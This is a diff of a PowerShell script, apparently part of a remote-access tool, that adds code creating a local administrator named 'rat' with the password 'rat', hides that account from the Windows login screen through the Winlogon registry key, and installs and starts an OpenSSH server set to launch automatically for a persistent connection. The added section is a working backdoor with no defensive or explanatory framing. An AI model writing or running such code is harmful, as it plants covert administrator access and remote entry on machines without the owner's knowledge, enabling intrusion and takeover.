@@ -27,31 +27,54 @@ New-Item -Path $newFolderPath -ItemType Directory
 
 Write-Output "New folder created: $newFolderPath"
 
-#open ssh
 
-Add-WindowsCapability -Online _name OpenSSH
-Server ~~~~ 0.0.1.0
-Start-Service sshd
-Set-service _name sshd -StartupType 'Automatic'
-Get-NetFireWallRule -name *ssh*
+# Define username and password for the new admin user
+$username = "rat"
+$password = ConvertTo-SecureString "rat" -AsPlainText -Force
 
-# #Make Hidden Local admin
-# # Define username and password for the new admin user
-# $username = "HiddenAdmin"
-# $password = ConvertTo-SecureString "YourPasswordHere" -AsPlainText -Force
+try {
+    # Create a new local user account
+    New-LocalUser -Name $username -Password $password -FullName "Hidden Administrator" -Description "Hidden Local Administrator Account" -AccountNeverExpires
 
-# # Create a new local user account
-# New-LocalUser -Name $username -Password $password -FullName "Hidden Administrator" -Description "Hidden Local Administrator Account" -AccountNeverExpires
+    # Add the new user to the local Administrators group
+    Add-LocalGroupMember -Group "Administrators" -Member $username
 
-# # Add the new user to the local Administrators group
-# Add-LocalGroupMember -Group "Administrators" -Member $username
+    # Hide the new user from the login screen
+    $registryPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList"
+    if (!(Test-Path $registryPath)) {
+        New-Item -Path $registryPath -Force | Out-Null
+    }
+    Set-ItemProperty -Path $registryPath -Name $username -Value 0
+} catch {
+    Write-Output "An error occurred: $_"
+}
 
-# # Hide the new user from the login screen
-# $registryPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList"
-# if (!(Test-Path $registryPath)) {
-#     New-Item -Path $registryPath -Force | Out-Null
-# }
-New-ItemProperty -Path $registryPath -Name $username -Value 0 -PropertyType DWORD -Force | Out-Null
+
+#open presistant SSH Connection
+
+try {
+    # Add the OpenSSH capability
+    Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
+    Write-Output "Successfully added the OpenSSH capability."
+
+    # Start the SSH service
+    Start-Service -Name sshd
+    Write-Output "Successfully started the SSH service."
+
+    # Set the SSH service to start automatically
+    Set-Service -Name sshd -StartupType 'Automatic'
+    Write-Output "Successfully set the SSH service to start automatically."
+
+    # Get the firewall rule for SSH
+    $sshFirewallRule = Get-NetFirewallRule -Name *ssh*
+    if ($sshFirewallRule) {
+        Write-Output "Successfully retrieved the SSH firewall rule."
+    } else {
+        Write-Output "No SSH firewall rule found."
+    }
+} catch {
+    Write-Output "An error occurred: $_"
+}
 
 
 
